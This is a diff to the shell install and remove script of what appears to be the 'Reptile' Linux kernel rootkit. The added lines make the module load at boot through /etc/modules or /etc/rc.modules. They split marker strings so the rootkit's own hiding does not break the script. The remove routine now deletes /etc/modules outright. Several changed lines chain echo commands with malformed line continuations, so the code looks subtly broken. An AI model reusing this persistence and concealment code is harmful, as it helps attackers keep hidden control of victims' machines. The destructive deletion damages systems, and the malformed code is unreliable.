@@ -126,12 +126,19 @@ function reptile_install {
 	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
-        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+		# we have to break these strings, cause when Reptile is loaded, this script may fail to remove
+        	echo -e "#<rep" >> /etc/modules \  
+		echo -e "tile>\nreptile\n#</rep" >> /etc/modules \
+		echo -e "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/rc.modules && \
+        	echo -e "#<rep" >> /etc/rc.modules \
+		echo -e "tile>\nreptile\n#</rep" >> /etc/rc.modules \
+		echo -e "tile>" >> /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
-        #	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        #	echo -e "#<rep" >> /etc/modules \
+	#	echo -e "tile>\nreptile\n#</rep" >> /etc/modules \
+	#	echo -e "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
 	depmod && insmod /$MODULE/$MODULE.ko && \
@@ -162,8 +169,8 @@ function reptile_remove {
 	rm -rf /$MODULE && \
 	rm -rf $DRIVER_DIRECTORY && \
 	rm -rf /etc/rc.modules && \
-	echo '' > /etc/modules && \
-	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
+	rm -rf /etc/modules && \
+	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	
 	directory_remove
 	echo
